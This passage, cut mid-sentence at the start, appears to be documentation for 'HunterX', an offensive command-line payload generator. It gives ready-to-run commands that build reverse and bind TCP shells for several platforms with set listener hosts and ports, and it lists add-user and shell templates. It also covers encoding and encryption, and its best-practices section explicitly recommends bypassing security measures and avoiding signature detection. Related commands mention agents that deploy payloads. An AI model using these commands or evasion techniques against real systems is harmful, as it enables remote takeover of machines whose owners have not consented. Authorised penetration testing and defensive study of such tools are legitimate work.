architectures.HunterX includes a comprehensive payload generator with support for multiple formats and encoding options.## Syntax```bashhunterx payload [SUBCOMMAND] [OPTIONS]```## Subcommands| Subcommand | Description ||------------|-------------|| `generate` | Generate a new payload || `list` | List available payload templates || `info` | Show detailed information about a specific payload template || `encode` | Encode an existing payload (e.g., base64, hex, xor) || `encrypt` | Encrypt a payload with a specified algorithm || `save` | Save a generated payload to a file || `list-formats` | List available output formats || `list-encoders` | List available encoding methods || `list-encryptors` | List available encryption methods |## Examples### Generate a Payload```bashhunterx payload generate --platform windows --arch x64 --type reverse_tcp --lhost 192.168.1.100 --lport 4444```### Generate a Payload with Custom Options```bashhunterx payload generate --platform linux --arch x86 --type bind_tcp --lport 5555 --prepend ./custom-header.bin```### List Available Payload Templates```bashhunterx payload list```Sample output:```Available Payload Templates:  Windows:    - reverse_tcp    - reverse_http    - reverse_https    - bind_tcp    - add_user    - execute  Linux:    - reverse_tcp    - reverse_http    - bind_tcp    - add_user    - execute  macOS:    - reverse_tcp    - reverse_http    - bind_tcp  Android:    - reverse_tcp    - reverse_http  iOS:    - reverse_tcp  Cross-platform:    - java_shell    - python_shell    - bash_shell    - powershell```### Get Payload Information```bashhunterx payload info --platform windows --arch x64 --type reverse_tcp```Sample output:```Payload: windows/x64/reverse_tcpPlatform: WindowsArchitecture: x64Type: TCP Reverse ShellDescription: Connects back to the attacker, providing a command shell.Default Port: 4444Default Host: 127.0.0.1Size: Approximately 320 bytesBadChars# Bytes (varies with options)Options:  lhost: Listener host (IP or hostname)  lport: Listener port (1-65535)  exitfunc: Exit function (thread, process, seh, none)  retry: Number of connection attempts  timeout: Connection timeout in seconds```### Encode a Payload```bashhunterx payload encode --input ./payload.bin --method base64 --output ./payload.b64```### Encrypt a Payload```bashhunterx payload encrypt --input ./payload.bin --method aes256 --key mysecretkey --output ./payload.enc```### Save a Payload to File```bashhunterx payload generate --platform linux --arch x64 --type reverse_tcp --lhost 10.0.0.5 --lport 8080 --save ./linux_x64_reverse.bin```## Common Options| Option | Description ||--------|-------------|| `--platform` | Target platform (windows, linux, macos, android, ios, etc.) || `--arch` | Target architecture (x86, x64, arm, arm64, etc.) || `--type` | Payload type (reverse_tcp, bind_tcp, reverse_http, etc.) || `--lhost` | Listener host (for reverse payloads) || `--lport` | Listener port (for reverse/bind payloads) || `--input` | Input file path (for encode/encrypt) || `--output` | Output file path || `--method` | Encoding or encryption method || `--key` | Encryption key (if applicable) || `--format` | Output format (raw, c, ruby, python, js, exe, dll, elf, macho) || `--save` | Save the generated payload to a file (alias for --output) || `--bad-chars` | Characters to avoid in the payload (e.g., \x00\xff) || `--iterations` | Number of encoding iterations || `--nop-sled` | Add a NOP sled of specified length || `--iterations` | Number of encoding/encryption iterations |## Payload FormatsHunterX can output payloads in various formats suitable for different injection contexts:- **raw**: Binary shellcode (default)- **c**: C array format- **ruby**: Ruby string- **python**: Python string- **js**: JavaScript string- **exe**: Windows executable- **dll**: Windows DLL- **elf**: Linux executable- **macho**: macOS executable## Encoding MethodsAvailable encoding methods to avoid bad characters or evade detection:- **base64**: Base64 encoding- **hex**: Hexadecimal encoding- **xor**: XOR encryption with a key- **rot13**: Rot13 encoding- **base64url**: URL-safe base64- **jwt**: JSON Web Token encoding (for specific contexts)- **custom**: Custom encoding via Python/ruby script## Encryption MethodsAvailable encryption methods for securing payloads:- **aes128**: AES 128-bit encryption- **aes256**: AES 256-bit encryption- **des**: DES encryption (legacy, not recommended)- **rsa**: RSA encryption (for key transport)- **chacha20**: ChaCha20 encryption- **none**: No encryption (plaintext)## Typical Workflow1. **Select Platform and Architecture**: Choose the target platform (Windows, Linux, etc.) and architecture (x86, x64, ARM).2. **Choose Payload Type**: Select the type of payload (reverse TCP, bind TCP, HTTP, etc.).3. **Configure Options**: Set listener host and port, exit function, retry settings, etc.4. **Generate**: Create the payload in the desired format.5. **Encode/Encrypt (Optional)**: Apply encoding or encryption to evade detection.6. **Save**: Save the payload to a file for use in an exploit.7. **Test**: Verify the payload works in a controlled environment.## Related Commands- `hunterx module` - Manage modules that may utilize payloads- `hunterx agent` - Agents that may deploy payloads during operations- `hunterx reasoning` - Generate hypotheses about which payloads to use- `hunterx encode` - Standalone encoding utility (if available)- `hunterx encrypt` - Standalone encryption utility (if available)## Common Errors- **Invalid Platform/Architecture**: Ensure the platform and architecture combination is supported- **Invalid Port**: Port must be between 1 and 65535- **Invalid Host**: Listener host must be a valid IP address or hostname- **Missing Options**: Required options (like lhost/lport for reverse payloads) are missing- **Encoding Failed**: Invalid encoding method or parameters- **Encryption Failed**: Invalid key or encryption parameters- **Bad Characters**: Generated payload contains restricted characters- **Output Format Not Supported**: Selected format is not available for the payload type## Best Practices- Always test payloads in a safe, isolated environment before use- Use encoding and encryption to bypass simple security measures- Update payload templates regularly to avoid signature detection- Consider the target'\''s architecture and OS version when selecting payloads- Use stageless payloads for simplicity when possible- For staged payloads, ensure the stager is small and the stage is hosted securely- Document payload generation parameters for reproducibility and troubleshooting- Combine payload generation with encoding and encryption for maximum evasion
